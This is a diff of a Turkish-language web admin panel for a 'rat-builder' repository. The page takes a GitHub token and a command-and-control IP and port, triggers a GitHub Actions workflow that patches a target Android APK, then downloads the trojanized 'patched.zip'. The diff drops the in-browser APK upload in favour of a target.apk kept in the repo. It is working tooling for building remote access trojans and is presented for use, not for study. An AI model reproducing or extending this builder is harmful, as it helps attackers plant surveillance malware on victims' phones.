@@ -33,7 +33,7 @@
     margin-top: 8px;
     margin-bottom: 4px;
   }
-  input[type="text"], input[type="file"] {
+  input[type="text"] {
     width: 100%;
     padding: 10px;
     background: #111;
@@ -43,7 +43,6 @@
     font-size: 13px;
     border-radius: 4px;
   }
-  input[type="file"] { padding: 6px; }
   button {
     width: 100%;
     padding: 12px;
@@ -77,11 +76,6 @@
   .ok { color: #0f0; }
   .err { color: #f00; }
   .warn { color: #ff0; }
-  .divider {
-    border-top: 1px dashed #0f0;
-    margin: 16px 0;
-    opacity: 0.5;
-  }
 </style>
 </head>
 <body>
@@ -94,20 +88,17 @@
  ██║  ██║██║███████║    ██║  ██║██║  ██║   ██║
  ╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
 </div>
-<div class="subtitle">[ AIS ADMIN PANEL v3.0 — HTML ]<br>[ hedef APK + GitHub builder ]</div>
+<div class="subtitle">[ AIS ADMIN PANEL v3.1 — HTML ]<br>[ APK repoda olmali: target.apk ]</div>
 
 <div class="form">
   <label>GitHub Token (ghp_...)</label>
   <input type="text" id="token" placeholder="ghp_xxxxxxxxxxxx" autocomplete="off">
 
-  <label>Repo (kullanıcı/ad)</label>
-  <input type="text" id="repo" value="Aiska/rat-builder">
+  <label>Repo (kullanici/ad)</label>
+  <input type="text" id="repo" value="Aiskart0/rat-builder">
 
-  <label>Workflow dosyası</label>
+  <label>Workflow dosyasi</label>
   <input type="text" id="workflow" value="build.yml">
-
-  <label>Hedef APK (dosya seç)</label>
-  <input type="file" id="apkFile" accept=".apk">
 
   <label>C2 IP</label>
   <input type="text" id="c2host" value="192.168.1.10">
@@ -124,30 +115,21 @@
 const GH_API = "https://api.github.com";
 let logEl;
 
-function log(msg, cls = "") {
+function log(msg, cls) {
   logEl = logEl || document.getElementById("log");
-  const span = document.createElement("div");
-  if (cls) span.className = cls;
+  const div = document.createElement("div");
+  if (cls) div.className = cls;
   const t = new Date().toLocaleTimeString();
-  span.textContent = `[${t}] ${msg}`;
-  logEl.appendChild(span);
+  div.textContent = "[" + t + "] " + msg;
+  logEl.appendChild(div);
   logEl.scrollTop = logEl.scrollHeight;
-}
-
-function b64Encode(bytes) {
-  let bin = "";
-  const chunk = 8192;
-  for (let i = 0; i < bytes.length; i += chunk) {
-    bin += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
-  }
-  return btoa(bin);
 }
 
 function ghHeaders(token) {
   return {
-    "Authorization": `token ${token}`,
+    "Authorization": "token " + token,
     "Accept": "application/vnd.github+json",
-    "Content-Type": "application/json",
+    "Content-Type": "application/json"
   };
 }
 
@@ -155,35 +137,25 @@ async function startBuild() {
   const token = document.getElementById("token").value.trim();
   const repo = document.getElementById("repo").value.trim();
   const workflow = document.getElementById("workflow").value.trim();
-  const fileInput = document.getElementById("apkFile");
   const c2host = document.getElementById("c2host").value.trim();
   const c2port = document.getElementById("c2port").value.trim();
   const buildBtn = document.getElementById("buildBtn");
 
   if (!token) { log("HATA: token bos", "err"); return; }
   if (!repo.includes("/")) { log("HATA: repo formati 'kullanici/ad'", "err"); return; }
-  if (!fileInput.files.length) { log("HATA: APK secilmedi", "err"); return; }
   if (!c2host) { log("HATA: C2 IP bos", "err"); return; }
 
   buildBtn.disabled = true;
+  logEl = document.getElementById("log");
   logEl.innerHTML = "";
 
   try {
-    log("APK okunuyor...", "info");
-    const file = fileInput.files[0];
-    log(`dosya: ${file.name} (${(file.size / 1024 / 1024).toFixed(2)} MB)`, "info");
-
-    const arrayBuf = await file.arrayBuffer();
-    const apkB64 = b64Encode(new Uint8Array(arrayBuf));
-    log(`base64: ${apkB64.length} karakter`, "ok");
-
-    const url = `${GH_API}/repos/${repo}/actions/workflows/${workflow}/dispatches`;
+    const url = GH_API + "/repos/" + repo + "/actions/workflows/" + workflow + "/dispatches";
     const body = {
       ref: "main",
       inputs: {
-        apk_b64: apkB64,
         c2_host: c2host,
-        c2_port: c2port,
+        c2_port: c2port
       }
     };
 
@@ -191,13 +163,13 @@ async function startBuild() {
     const r = await fetch(url, {
       method: "POST",
       headers: ghHeaders(token),
-      body: JSON.stringify(body),
+      body: JSON.stringify(body)
     });
 
     if (r.status !== 204) {
       const txt = await r.text();
-      log(`HATA: tetikleme ${r.status}`, "err");
-      log(txt.substring(0, 300), "err");
+      log("HATA: tetikleme " + r.status, "err");
+      log(txt.substring(0, 400), "err");
       buildBtn.disabled = false;
       return;
     }
@@ -207,26 +179,27 @@ async function startBuild() {
     const runId = await waitForRun(token, repo);
     if (!runId) { log("HATA: calisma bulunamadi", "err"); buildBtn.disabled = false; return; }
 
-    log(`calisma id: ${runId}`, "info");
+    log("calisma id: " + runId, "info");
     log("artifact indiriliyor...", "info");
     await downloadArtifact(token, repo, runId);
 
     log("BITTI", "ok");
   } catch (e) {
-    log(`HATA: ${e.message}`, "err");
+    log("HATA: " + e.message, "err");
   }
   buildBtn.disabled = false;
 }
 
-async function waitForRun(token, repo, timeoutMs = 1800000) {
+async function waitForRun(token, repo, timeoutMs) {
+  timeoutMs = timeoutMs || 1800000;
   const start = Date.now();
-  const url = `${GH_API}/repos/${repo}/actions/runs?per_page=3`;
+  const url = GH_API + "/repos/" + repo + "/actions/runs?per_page=3";
   let lastStatus = "";
   while (Date.now() - start < timeoutMs) {
     try {
       const r = await fetch(url, { headers: ghHeaders(token) });
       if (r.status !== 200) {
-        log(`API ${r.status}`, "err");
+        log("API " + r.status, "err");
         await sleep(15000);
         continue;
       }
@@ -235,13 +208,13 @@ async function waitForRun(token, repo, timeoutMs = 1800000) {
       if (runs.length) {
         const run = runs[0];
         if (run.status !== lastStatus) {
-          log(`durum: ${run.status}`, run.status === "completed" ? "ok" : "warn");
+          log("durum: " + run.status, run.status === "completed" ? "ok" : "warn");
           lastStatus = run.status;
         }
         if (run.status === "completed") return run.id;
       }
     } catch (e) {
-      log(`bekleme: ${e.message}`, "warn");
+      log("bekleme: " + e.message, "warn");
     }
     await sleep(15000);
   }
@@ -249,18 +222,18 @@ async function waitForRun(token, repo, timeoutMs = 1800000) {
 }
 
 async function downloadArtifact(token, repo, runId) {
-  const url = `${GH_API}/repos/${repo}/actions/runs/${runId}/artifacts`;
+  const url = GH_API + "/repos/" + repo + "/actions/runs/" + runId + "/artifacts";
   const r = await fetch(url, { headers: ghHeaders(token) });
-  if (r.status !== 200) { log(`artifact API ${r.status}`, "err"); return; }
+  if (r.status !== 200) { log("artifact API " + r.status, "err"); return; }
   const data = await r.json();
   const arts = data.artifacts || [];
   if (!arts.length) { log("artifact yok", "err"); return; }
   const art = arts[0];
-  log(`artifact: ${art.name} (${(art.size_in_bytes / 1024 / 1024).toFixed(2)} MB)`, "info");
+  log("artifact: " + art.name + " (" + (art.size_in_bytes / 1024 / 1024).toFixed(2) + " MB)", "info");
 
   const dlUrl = art.archive_download_url;
   const dl = await fetch(dlUrl, { headers: ghHeaders(token), redirect: "follow" });
-  if (dl.status !== 200) { log(`indirme ${dl.status}`, "err"); return; }
+  if (dl.status !== 200) { log("indirme " + dl.status, "err"); return; }
 
   const blob = await dl.blob();
   const a = document.createElement("a");
@@ -270,9 +243,9 @@ async function downloadArtifact(token, repo, runId) {
   log("indirildi: patched.zip (zipten cikar)", "ok");
 }
 
-function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-log("hazir. token ve hedef APK gir.", "info");
+log("hazir. APK repoda 'target.apk' olmali.", "info");
 </script>
 
 </body>
